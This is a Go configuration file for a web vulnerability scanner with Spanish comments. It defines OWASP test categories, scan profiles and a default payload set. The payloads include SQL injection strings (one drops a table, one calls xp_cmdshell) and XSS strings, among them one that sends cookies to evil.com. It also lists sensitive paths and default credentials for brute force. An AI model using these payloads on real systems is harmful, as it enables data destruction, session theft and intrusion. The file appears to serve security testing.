package config

import (
	"encoding/json"
	"fmt"
	"os"
	"time"
)

// Config contiene la configuración del escáner
type Config struct {
	// Configuración de red
	Concurrent int           `json:"concurrent"`
	Timeout    time.Duration `json:"timeout"`

	// User-Agent para las requests
	UserAgent string `json:"user_agent"`

	// Headers adicionales
	Headers map[string]string `json:"headers"`

	// Configuración de tests
	Tests TestConfig `json:"tests"`

	// Configuración de output
	Verbose bool `json:"verbose"`

	// Configuraciones avanzadas
	Language     string       `json:"language"`      // Idioma de la interfaz
	LastUsedURL  string       `json:"last_used_url"` // Última URL escaneada
	AutoSave     bool         `json:"auto_save"`     // Guardar configuración automáticamente
	Theme        string       `json:"theme"`         // Tema de la interfaz
	Tutorial     bool         `json:"tutorial"`      // Mostrar tutorial en primer uso
	ScanProfiles ScanProfiles `json:"scan_profiles"` // Perfiles de escaneo predefinidos
}

// TestConfig configura qué tests ejecutar
type TestConfig struct {
	// Tests existentes (compatibilidad)
	SQLInjection   bool `json:"sql_injection"`
	XSS            bool `json:"xss"`
	BruteForce     bool `json:"brute_force"`
	HTTPHeaders    bool `json:"http_headers"`
	SSLAnalysis    bool `json:"ssl_analysis"`
	CSRFProtection bool `json:"csrf_protection"`
	FileUpload     bool `json:"file_upload"`
	DirTraversal   bool `json:"directory_traversal"` // Corregir nombre del campo
	InfoDisclosure bool `json:"info_disclosure"`

	// Nuevas categorías OWASP
	InfoGathering   bool `json:"info_gathering"`   // INFO: Recolección de información
	Configuration   bool `json:"configuration"`    // CONF: Verificación de configuración
	IdentityMgmt    bool `json:"identity_mgmt"`    // IDNT: Gestión de identidad
	Authentication  bool `json:"authentication"`   // ATHN: Autenticación
	Authorization   bool `json:"authorization"`    // ATHZ: Autorización
	SessionMgmt     bool `json:"session_mgmt"`     // SESS: Gestión de sesiones
	InputValidation bool `json:"input_validation"` // INPV: Validación de entradas
	ErrorHandling   bool `json:"error_handling"`   // ERRH: Manejo de errores
	Cryptography    bool `json:"cryptography"`     // CRYP: Criptografía
	BusinessLogic   bool `json:"business_logic"`   // BUSL: Lógica de negocio
	ClientSide      bool `json:"client_side"`      // CLNT: Cliente
	APISecurity     bool `json:"api_security"`     // APIT: APIs

	// Configuración de agresividad
	UseAdvancedTests bool `json:"use_advanced_tests"` // Usar tests agresivos y exhaustivos
}

// ScanProfile representa un perfil de escaneo predefinido
type ScanProfile struct {
	Name             string        `json:"name"`
	Description      string        `json:"description"`
	Timeout          time.Duration `json:"timeout"`
	Concurrent       int           `json:"concurrent"`
	UseAdvancedTests bool          `json:"use_advanced_tests"`
	Tests            TestConfig    `json:"tests"`
}

// ScanProfiles contiene todos los perfiles de escaneo
type ScanProfiles struct {
	Basic    ScanProfile `json:"basic"`
	Standard ScanProfile `json:"standard"`
	Advanced ScanProfile `json:"advanced"`
}

// PayloadConfig contiene los payloads para diferentes ataques
type PayloadConfig struct {
	SQLPayloads       []string     `json:"sql_payloads"`
	XSSPayloads       []string     `json:"xss_payloads"`
	CommonPaths       []string     `json:"common_paths"`
	CommonCredentials []Credential `json:"common_credentials"`
}

// Credential representa credenciales para brute force
type Credential struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

// LoadConfig carga la configuración desde un archivo JSON
func LoadConfig(filename string) (*Config, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	var config Config
	err = json.Unmarshal(data, &config)
	if err != nil {
		return nil, err
	}

	// Convertir timeout de string a duration si es necesario
	return &config, nil
}

// DefaultConfig retorna la configuración por defecto
func DefaultConfig() *Config {
	return &Config{
		Concurrent: 10,
		Timeout:    30 * time.Second,
		UserAgent:  "VersaSecurityTest/1.0 (Security Scanner)",
		Headers: map[string]string{
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "keep-alive",
		},
		Tests: TestConfig{
			// Tests existentes
			SQLInjection:   true,
			XSS:            true,
			BruteForce:     false, // Por defecto deshabilitado
			HTTPHeaders:    true,
			SSLAnalysis:    false, // Por defecto deshabilitado
			CSRFProtection: false, // Por defecto deshabilitado
			FileUpload:     false, // Por defecto deshabilitado
			DirTraversal:   false, // Por defecto deshabilitado
			InfoDisclosure: true,

			// Nuevas categorías OWASP (habilitadas por defecto las básicas)
			InfoGathering:   true,  // INFO: Básico y seguro
			Configuration:   true,  // CONF: Básico y seguro
			IdentityMgmt:    false, // IDNT: Puede ser intrusivo
			Authentication:  false, // ATHN: Puede ser intrusivo
			Authorization:   false, // ATHZ: Puede ser intrusivo
			SessionMgmt:     true,  // SESS: Básico y seguro
			InputValidation: true,  // INPV: Incluye SQL/XSS existentes
			ErrorHandling:   true,  // ERRH: Básico y seguro
			Cryptography:    true,  // CRYP: Básico y seguro
			BusinessLogic:   false, // BUSL: Puede ser intrusivo
			ClientSide:      true,  // CLNT: Básico y seguro
			APISecurity:     true,  // APIT: Básico y seguro

			// Configuración de agresividad
			UseAdvancedTests: true, // Usar tests avanzados por defecto para máxima efectividad
		},
		Verbose: false,
		// Configuraciones avanzadas
		Language:    "es", // Español por defecto
		LastUsedURL: "",
		AutoSave:    true,
		Theme:       "default",
		Tutorial:    true, // Mostrar tutorial en primer uso
	}
}

// TestDefinition representa la definición de un test disponible
type TestDefinition struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Description string `json:"description"`
	Category    string `json:"category"`
	Recommended bool   `json:"recommended"`
	HasAdvanced bool   `json:"has_advanced"` // Indica si este test tiene versión avanzada
}

// GetAvailableTests retorna todos los tests disponibles en el sistema
func GetAvailableTests() []TestDefinition {
	return []TestDefinition{
		// Tests específicos con versiones avanzadas
		{ID: "sql_injection", Name: "SQL Injection", Description: "Inyección SQL en parámetros", Category: "INPV", Recommended: true, HasAdvanced: true},
		{ID: "xss", Name: "Cross-Site Scripting", Description: "XSS reflejado y almacenado", Category: "INPV", Recommended: true, HasAdvanced: true},
		{ID: "http_headers", Name: "Security Headers", Description: "Headers de seguridad HTTP", Category: "CLNT", Recommended: true, HasAdvanced: true},
		{ID: "directory_traversal", Name: "Directory Traversal", Description: "Vulnerabilidades de path traversal", Category: "INPV", Recommended: true, HasAdvanced: true},

		// Tests categóricos OWASP
		{ID: "info_gathering", Name: "Information Gathering", Description: "Recolección de información del servidor", Category: "INFO", Recommended: true, HasAdvanced: false},
		{ID: "configuration", Name: "Configuration", Description: "Verificación de configuración", Category: "CONF", Recommended: true, HasAdvanced: false},
		{ID: "identity_mgmt", Name: "Identity Management", Description: "Mecanismos de gestión de identidad", Category: "IDNT", Recommended: false, HasAdvanced: false},
		{ID: "authentication", Name: "Authentication", Description: "Mecanismos de autenticación", Category: "ATHN", Recommended: false, HasAdvanced: false},
		{ID: "authorization", Name: "Authorization", Description: "Control de acceso y autorización", Category: "ATHZ", Recommended: true, HasAdvanced: false},
		{ID: "session_mgmt", Name: "Session Management", Description: "Gestión de sesiones y tokens", Category: "SESS", Recommended: true, HasAdvanced: false},
		{ID: "input_validation", Name: "Input Validation", Description: "Validación y saneamiento de entradas", Category: "INPV", Recommended: true, HasAdvanced: false},
		{ID: "error_handling", Name: "Error Handling", Description: "Manejo de errores", Category: "ERRH", Recommended: false, HasAdvanced: false},
		{ID: "cryptography", Name: "Cryptography", Description: "Uso correcto de criptografía", Category: "CRYP", Recommended: false, HasAdvanced: false},
		{ID: "business_logic", Name: "Business Logic", Description: "Lógica de negocio y procesos", Category: "BUSL", Recommended: false, HasAdvanced: false},
		{ID: "client_side", Name: "Client-Side Security", Description: "Seguridad del lado del cliente", Category: "CLNT", Recommended: true, HasAdvanced: false},
		{ID: "api_security", Name: "API Security", Description: "Seguridad en APIs REST/GraphQL", Category: "APIT", Recommended: true, HasAdvanced: false},

		// Tests adicionales
		{ID: "brute_force", Name: "Brute Force", Description: "Vulnerabilidades de fuerza bruta", Category: "ATHN", Recommended: false, HasAdvanced: false},
		{ID: "csrf_protection", Name: "CSRF Protection", Description: "Protección contra CSRF", Category: "SESS", Recommended: false, HasAdvanced: false},
		{ID: "file_upload", Name: "File Upload Security", Description: "Seguridad en carga de archivos", Category: "INPV", Recommended: false, HasAdvanced: false},
		{ID: "ssl_analysis", Name: "SSL/TLS Analysis", Description: "Análisis de configuración SSL/TLS", Category: "CRYP", Recommended: true, HasAdvanced: false},
		{ID: "info_disclosure", Name: "Information Disclosure", Description: "Revelación de información sensible", Category: "ERRH", Recommended: false, HasAdvanced: false},
	}
}

// IsTestEnabled verifica si un test está habilitado en la configuración
func (c *Config) IsTestEnabled(testID string) bool {
	switch testID {
	case "sql_injection":
		return c.Tests.SQLInjection
	case "xss":
		return c.Tests.XSS
	case "brute_force":
		return c.Tests.BruteForce
	case "http_headers":
		return c.Tests.HTTPHeaders
	case "ssl_analysis":
		return c.Tests.SSLAnalysis
	case "csrf_protection":
		return c.Tests.CSRFProtection
	case "file_upload":
		return c.Tests.FileUpload
	case "directory_traversal":
		return c.Tests.DirTraversal
	case "info_disclosure":
		return c.Tests.InfoDisclosure
	case "info_gathering":
		return c.Tests.InfoGathering
	case "configuration":
		return c.Tests.Configuration
	case "identity_mgmt":
		return c.Tests.IdentityMgmt
	case "authentication":
		return c.Tests.Authentication
	case "authorization":
		return c.Tests.Authorization
	case "session_mgmt":
		return c.Tests.SessionMgmt
	case "input_validation":
		return c.Tests.InputValidation
	case "error_handling":
		return c.Tests.ErrorHandling
	case "cryptography":
		return c.Tests.Cryptography
	case "business_logic":
		return c.Tests.BusinessLogic
	case "client_side":
		return c.Tests.ClientSide
	case "api_security":
		return c.Tests.APISecurity
	default:
		return false
	}
}

// SetTestEnabled habilita o deshabilita un test en la configuración
func (c *Config) SetTestEnabled(testID string, enabled bool) {
	switch testID {
	case "sql_injection":
		c.Tests.SQLInjection = enabled
	case "xss":
		c.Tests.XSS = enabled
	case "brute_force":
		c.Tests.BruteForce = enabled
	case "http_headers":
		c.Tests.HTTPHeaders = enabled
	case "ssl_analysis":
		c.Tests.SSLAnalysis = enabled
	case "csrf_protection":
		c.Tests.CSRFProtection = enabled
	case "file_upload":
		c.Tests.FileUpload = enabled
	case "directory_traversal":
		c.Tests.DirTraversal = enabled
	case "info_disclosure":
		c.Tests.InfoDisclosure = enabled
	case "info_gathering":
		c.Tests.InfoGathering = enabled
	case "configuration":
		c.Tests.Configuration = enabled
	case "identity_mgmt":
		c.Tests.IdentityMgmt = enabled
	case "authentication":
		c.Tests.Authentication = enabled
	case "authorization":
		c.Tests.Authorization = enabled
	case "session_mgmt":
		c.Tests.SessionMgmt = enabled
	case "input_validation":
		c.Tests.InputValidation = enabled
	case "error_handling":
		c.Tests.ErrorHandling = enabled
	case "cryptography":
		c.Tests.Cryptography = enabled
	case "business_logic":
		c.Tests.BusinessLogic = enabled
	case "client_side":
		c.Tests.ClientSide = enabled
	case "api_security":
		c.Tests.APISecurity = enabled
	}
}

// SaveConfig guarda la configuración en un archivo JSON
func (c *Config) SaveConfig(filename string) error {
	data, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(filename, data, 0644)
}

// UpdateLastUsedURL actualiza la última URL usada
func (c *Config) UpdateLastUsedURL(url string) {
	c.LastUsedURL = url
	if c.AutoSave {
		c.SaveConfig("config.json") // Guardar automáticamente
	}
}

// LoadOrCreateConfig carga la configuración o crea una nueva si no existe
func LoadOrCreateConfig(filename string) (*Config, error) {
	config, err := LoadConfig(filename)
	if err != nil {
		// Si no existe el archivo, crear uno nuevo
		config = DefaultConfig()
		err = config.SaveConfig(filename)
		if err != nil {
			return nil, err
		}
	}
	return config, nil
}

// GetPayloads retorna los payloads por defecto
func GetPayloads() *PayloadConfig {
	return &PayloadConfig{
		SQLPayloads: []string{
			"'",
			"' OR '1'='1",
			"'; DROP TABLE users; --",
			"' UNION SELECT null, username, password FROM users --",
			"admin'--",
			"' OR 1=1 --",
			"') OR ('1'='1",
			"1' OR '1'='1",
			"\" OR \"1\"=\"1",
			"'; EXEC xp_cmdshell('dir'); --",
		},
		XSSPayloads: []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"<svg onload=alert('XSS')>",
			"javascript:alert('XSS')",
			"<body onload=alert('XSS')>",
			"<iframe src=javascript:alert('XSS')>",
			"<script>document.location='http://evil.com/'+document.cookie</script>",
			"'><script>alert('XSS')</script>",
			"\"><script>alert('XSS')</script>",
			"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
		},
		CommonPaths: []string{
			"/admin",
			"/admin/",
			"/administrator",
			"/admin.php",
			"/admin/login",
			"/admin/index.php",
			"/wp-admin",
			"/wp-admin/",
			"/login",
			"/login.php",
			"/signin",
			"/dashboard",
			"/panel",
			"/cpanel",
			"/control",
			"/manager",
			"/phpmyadmin",
			"/backup",
			"/backup.zip",
			"/config.php",
			"/.git",
			"/.git/config",
			"/.env",
			"/web.config",
			"/.htaccess",
			"/robots.txt",
			"/sitemap.xml",
			"/crossdomain.xml",
			"/server-status",
			"/server-info",
			"/test.php",
			"/info.php",
			"/phpinfo.php",
		},
		CommonCredentials: []Credential{
			{"admin", "admin"},
			{"admin", "password"},
			{"admin", "123456"},
			{"admin", "admin123"},
			{"administrator", "administrator"},
			{"root", "root"},
			{"root", "toor"},
			{"root", "123456"},
			{"user", "user"},
			{"guest", "guest"},
			{"test", "test"},
			{"demo", "demo"},
			{"admin", ""},
			{"", "admin"},
			{"sa", ""},
			{"postgres", "postgres"},
		},
	}
}

// TUIConfig contiene la configuración específica de la TUI
type TUIConfig struct {
	LastUsedURL  string `json:"last_used_url"`
	LastProtocol bool   `json:"last_protocol"` // true = HTTPS, false = HTTP
	AutoStart    bool   `json:"auto_start"`    // Si debe ir directo al paso 3
}

// LoadTUIConfig carga la configuración de la TUI desde archivo
func LoadTUIConfig() *TUIConfig {
	config := &TUIConfig{
		LastUsedURL:  "",
		LastProtocol: true, // HTTPS por defecto
		AutoStart:    false,
	}

	data, err := os.ReadFile("tui_config.json")
	if err != nil {
		return config // Retornar configuración por defecto si no existe
	}

	json.Unmarshal(data, config)
	return config
}

// SaveTUIConfig guarda la configuración de la TUI en archivo
func SaveTUIConfig(config *TUIConfig) error {
	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile("tui_config.json", data, 0644)
}

// ApplyProfile aplica un perfil de escaneo a la configuración actual
func (c *Config) ApplyProfile(profileID string) error {
	var profile ScanProfile

	switch profileID {
	case "basic":
		profile = c.ScanProfiles.Basic
	case "standard":
		profile = c.ScanProfiles.Standard
	case "advanced":
		profile = c.ScanProfiles.Advanced
	default:
		return fmt.Errorf("perfil desconocido: %s", profileID)
	}

	// Aplicar configuración del perfil
	c.Timeout = profile.Timeout
	c.Concurrent = profile.Concurrent
	c.Tests.UseAdvancedTests = profile.UseAdvancedTests
	c.Tests = profile.Tests

	return nil
}

// GetProfileInfo retorna información sobre un perfil específico
func (c *Config) GetProfileInfo(profileID string) (*ScanProfile, error) {
	switch profileID {
	case "basic":
		return &c.ScanProfiles.Basic, nil
	case "standard":
		return &c.ScanProfiles.Standard, nil
	case "advanced":
		return &c.ScanProfiles.Advanced, nil
	default:
		return nil, fmt.Errorf("perfil desconocido: %s", profileID)
	}
}

// CountEnabledTests cuenta cuántos tests están habilitados en un perfil
func (c *Config) CountEnabledTests(profileID string) int {
	profile, err := c.GetProfileInfo(profileID)
	if err != nil {
		return 0
	}

	count := 0
	tests := profile.Tests

	// Contar tests habilitados
	if tests.SQLInjection {
		count++
	}
	if tests.XSS {
		count++
	}
	if tests.BruteForce {
		count++
	}
	if tests.HTTPHeaders {
		count++
	}
	if tests.SSLAnalysis {
		count++
	}
	if tests.CSRFProtection {
		count++
	}
	if tests.FileUpload {
		count++
	}
	if tests.DirTraversal {
		count++
	}
	if tests.InfoDisclosure {
		count++
	}
	if tests.InfoGathering {
		count++
	}
	if tests.Configuration {
		count++
	}
	if tests.IdentityMgmt {
		count++
	}
	if tests.Authentication {
		count++
	}
	if tests.Authorization {
		count++
	}
	if tests.SessionMgmt {
		count++
	}
	if tests.InputValidation {
		count++
	}
	if tests.ErrorHandling {
		count++
	}
	if tests.Cryptography {
		count++
	}
	if tests.BusinessLogic {
		count++
	}
	if tests.ClientSide {
		count++
	}
	if tests.APISecurity {
		count++
	}

	return count
}

// GetAvailableProfiles retorna lista de todos los perfiles disponibles
func (c *Config) GetAvailableProfiles() []string {
	return []string{"basic", "standard", "advanced"}
}
